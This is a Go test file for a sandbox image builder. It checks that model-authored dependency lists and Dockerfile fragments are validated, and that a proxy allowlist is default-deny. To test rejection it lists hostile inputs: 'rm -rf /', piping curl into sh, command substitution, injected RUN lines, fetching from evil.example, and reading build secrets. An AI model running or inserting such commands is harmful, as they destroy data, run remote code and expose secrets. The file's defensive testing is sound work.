package imagespec_test

import (
	"errors"
	"regexp"
	"strings"
	"testing"

	"github.com/skael-dev/skael/internal/eval/sandbox"
	"github.com/skael-dev/skael/internal/eval/sandbox/imagespec"
	"github.com/skael-dev/skael/internal/eval/spec"
)

func env(mut ...func(*sandbox.EnvSpec)) sandbox.EnvSpec {
	e := sandbox.EnvSpec{
		Skill:   "demo",
		BaseTag: imagespec.DefaultBaseTag,
		Deps:    spec.DepsDecl{Pip: []string{"pandas==2.2.0", "numpy"}, Apt: []string{"poppler-utils"}},
	}
	for _, f := range mut {
		f(&e)
	}
	return e
}

func TestDepsDigest_IsOrderIndependent(t *testing.T) {
	a, err := imagespec.DepsDigest(env())
	if err != nil {
		t.Fatal(err)
	}
	b, err := imagespec.DepsDigest(env(func(e *sandbox.EnvSpec) {
		e.Deps.Pip = []string{"numpy", "pandas==2.2.0"}
	}))
	if err != nil {
		t.Fatal(err)
	}
	// The digest is a cache key. If declaration order changes it, every
	// regenerated spec rebuilds every layer for no reason.
	if a != b {
		t.Errorf("digest changed with dep order: %s vs %s", a, b)
	}
}

func TestDepsDigest_ChangesWithTheBaseTag(t *testing.T) {
	a, err := imagespec.DepsDigest(env())
	if err != nil {
		t.Fatal(err)
	}
	b, err := imagespec.DepsDigest(env(func(e *sandbox.EnvSpec) { e.BaseTag = "whetstone-base:2" }))
	if err != nil {
		t.Fatal(err)
	}
	// A layer is only equivalent over the same base. Ignoring the base tag
	// serves a stale layer built on an image that no longer exists, and the
	// resulting run failures look like skill failures.
	if a == b {
		t.Error("digest ignored the base tag; a rebuilt base would serve a stale layer")
	}
}

func TestDepsDigest_ChangesWithTheFragment(t *testing.T) {
	a, _ := imagespec.DepsDigest(env())
	b, err := imagespec.DepsDigest(env(func(e *sandbox.EnvSpec) { e.EnvFrag = "ENV TZ=UTC" }))
	if err != nil {
		t.Fatal(err)
	}
	if a == b {
		t.Error("digest ignored EnvFrag")
	}
}

func TestValidateDeps_RejectsShellMetacharacters(t *testing.T) {
	// Deps come from a model-authored spec and land in a RUN instruction. This
	// is the difference between a dependency list and arbitrary code execution
	// during an image build.
	for _, dep := range []string{
		"pandas; rm -rf /",
		"pandas && curl https://x | sh",
		"$(whoami)",
		"`id`",
		"pandas\nRUN echo pwned",
		"--index-url=https://evil.example/simple",
		"../../etc/passwd",
		"",
	} {
		d := spec.DepsDecl{Pip: []string{dep}}
		if err := imagespec.ValidateDeps(d); !errors.Is(err, imagespec.ErrUnsafeDep) {
			t.Errorf("ValidateDeps(%q) = %v, want ErrUnsafeDep", dep, err)
		}
	}
}

func TestValidateDeps_AcceptsOrdinaryPackages(t *testing.T) {
	d := spec.DepsDecl{
		Apt: []string{"poppler-utils", "libreoffice-calc"},
		Pip: []string{"pandas==2.2.0", "python-docx", "ruamel.yaml"},
		Npm: []string{"prettier", "@anthropic-ai/claude-code@2.1.220"},
	}
	if err := imagespec.ValidateDeps(d); err != nil {
		t.Errorf("ValidateDeps rejected ordinary packages: %v", err)
	}
}

func TestValidateFragment_RejectsEscapingInstructions(t *testing.T) {
	for _, frag := range []string{
		"FROM alpine",                         // escapes the pinned base
		"ADD https://evil.example/x.sh /x.sh", // fetches from the network at build time
		"RUN --mount=type=secret,id=k cat /run/secrets/k",
		"ONBUILD RUN echo x",
		"VOLUME /",
	} {
		if err := imagespec.ValidateFragment(frag); !errors.Is(err, imagespec.ErrUnsafeFragment) {
			t.Errorf("ValidateFragment(%q) = %v, want ErrUnsafeFragment", frag, err)
		}
	}
}

func TestValidateFragment_AcceptsTheSafelist(t *testing.T) {
	frag := "ENV TZ=UTC\nWORKDIR /workspace\nRUN mkdir -p /opt/fixtures\nCOPY environment/ /opt/fixtures/\n"
	if err := imagespec.ValidateFragment(frag); err != nil {
		t.Errorf("ValidateFragment rejected the safelist: %v", err)
	}
	if err := imagespec.ValidateFragment(""); err != nil {
		t.Errorf("ValidateFragment rejected an empty fragment: %v", err)
	}
}

func TestValidateFragment_TracksRealLineContinuation(t *testing.T) {
	// A continuation line belongs to the instruction above it, but only when
	// the previous physical line actually ends in a trailing backslash — not
	// merely because the continuation line's own text starts with "&&" or "|".

	// The false-reject the earlier prefix heuristic produced: a multi-line ENV
	// that doesn't use the "&&"-per-line idiom.
	if err := imagespec.ValidateFragment("ENV FOO=bar \\\n    BAZ=qux\n"); err != nil {
		t.Errorf("ValidateFragment rejected a real backslash continuation of ENV: %v", err)
	}

	// The idiomatic multi-line RUN must keep working.
	if err := imagespec.ValidateFragment("RUN apt-get update \\\n    && apt-get install -y jq\n"); err != nil {
		t.Errorf("ValidateFragment rejected a real backslash continuation of RUN: %v", err)
	}

	// A line starting with "&&" whose predecessor has no trailing backslash is
	// not a continuation, and the validator must say so on its own rather than
	// relying on Docker's parser to reject it later.
	err := imagespec.ValidateFragment("RUN apt-get update\n&& apt-get install -y jq\n")
	if !errors.Is(err, imagespec.ErrUnsafeFragment) {
		t.Errorf("ValidateFragment(%q) = %v, want ErrUnsafeFragment for a false continuation", "&&...", err)
	}

	// A build-secret flag split across a real continuation must still be
	// caught: the safelist check is skipped for a continuation line, but the
	// secret-mount check is not.
	err = imagespec.ValidateFragment("RUN --mount=type=secret,id=k \\\n    cat /run/secrets/k\n")
	if !errors.Is(err, imagespec.ErrUnsafeFragment) {
		t.Errorf("ValidateFragment(%q) = %v, want ErrUnsafeFragment for a secret mount split across a continuation", "--mount=type=secret...", err)
	}
}

func TestRender_LayersOverTheBaseAndValidatesFirst(t *testing.T) {
	got, err := imagespec.Render(env())
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	if !strings.HasPrefix(got, "FROM "+imagespec.DefaultBaseTag+"\n") {
		t.Errorf("Render did not start FROM the base tag:\n%s", got)
	}
	if !strings.Contains(got, "pandas==2.2.0") || !strings.Contains(got, "poppler-utils") {
		t.Errorf("Render dropped a dep:\n%s", got)
	}

	_, err = imagespec.Render(env(func(e *sandbox.EnvSpec) {
		e.Deps.Pip = []string{"pandas; rm -rf /"}
	}))
	if !errors.Is(err, imagespec.ErrUnsafeDep) {
		t.Errorf("Render err = %v, want it to validate before emitting", err)
	}
}

func TestBaseDockerfile_SlimDropsTheHeavyTools(t *testing.T) {
	full := imagespec.BaseDockerfile(false)
	slim := imagespec.BaseDockerfile(true)
	if !strings.Contains(full, "libreoffice") {
		t.Error("the full base image lost LibreOffice; document skills need it")
	}
	// The slim image is what makes the docker-tagged tests gate CI in a few
	// minutes instead of twenty.
	if strings.Contains(slim, "libreoffice") || strings.Contains(slim, "ffmpeg") {
		t.Error("the slim base image carries the heavy tools; the CI job will time out")
	}
	for _, want := range []string{"python3", "nodejs", "jq", "tinyproxy"} {
		if !strings.Contains(slim, want) {
			t.Errorf("the slim base image is missing %s, which the sandbox tests need", want)
		}
	}
}

func TestProxyConfig_EmitsOneFilterEntryPerDomain(t *testing.T) {
	cfg, err := imagespec.ProxyConfig([]string{"api.anthropic.com", "statsig.anthropic.com"})
	if err != nil {
		t.Fatal(err)
	}

	for _, want := range []string{"FilterDefaultDeny Yes", "FilterExtended On"} {
		// The config is only default-deny if both directives survive: without
		// FilterDefaultDeny Yes an unlisted domain is let through, and without
		// FilterExtended On the entries below are basic-regexp syntax where
		// "(", ")" and "|" are literal characters, so every entry matches
		// nothing — a silent total block, not a working allowlist.
		if !strings.Contains(cfg, want) {
			t.Errorf("config missing %q:\n%s", want, cfg)
		}
	}

	parts := strings.SplitN(cfg, imagespec.FilterMarker, 2)
	if len(parts) != 2 {
		t.Fatalf("config did not contain the filter marker %q:\n%s", imagespec.FilterMarker, cfg)
	}
	var entry *regexp.Regexp
	for _, line := range strings.Split(strings.TrimSpace(parts[1]), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		re, err := regexp.Compile(line)
		if err != nil {
			t.Fatalf("filter entry %q did not compile as a regexp: %v", line, err)
		}
		if re.MatchString("api.anthropic.com") {
			entry = re
		}
	}
	if entry == nil {
		t.Fatalf("no filter entry matched api.anthropic.com:\n%s", cfg)
	}

	if !entry.MatchString("metrics.api.anthropic.com") {
		t.Error("the entry for api.anthropic.com should also match a subdomain, metrics.api.anthropic.com")
	}
	// The suffix attack the trailing $ anchor exists to stop.
	if entry.MatchString("api.anthropic.com.evil.example") {
		t.Error("the entry for api.anthropic.com also matched api.anthropic.com.evil.example; the $ anchor is not doing its job")
	}
	// The look-alike domain QuoteMeta exists to stop: an unescaped "." in the
	// entry is "any character" and would let this through a proxy whose whole
	// job is to be default-deny.
	if entry.MatchString("api-anthropic.com") {
		t.Error("the entry for api.anthropic.com also matched api-anthropic.com; its dots are not escaped")
	}

	// A domain carrying config syntax would otherwise rewrite the proxy's own
	// rules — the allowlist is the enforcement point, so it validates its input.
	if _, err := imagespec.ProxyConfig([]string{"x\nFilterDefaultDeny No"}); err == nil {
		t.Error("ProxyConfig accepted a domain containing a newline")
	}
	if _, err := imagespec.ProxyConfig(nil); err == nil {
		t.Error("ProxyConfig accepted an empty allowlist")
	}
}
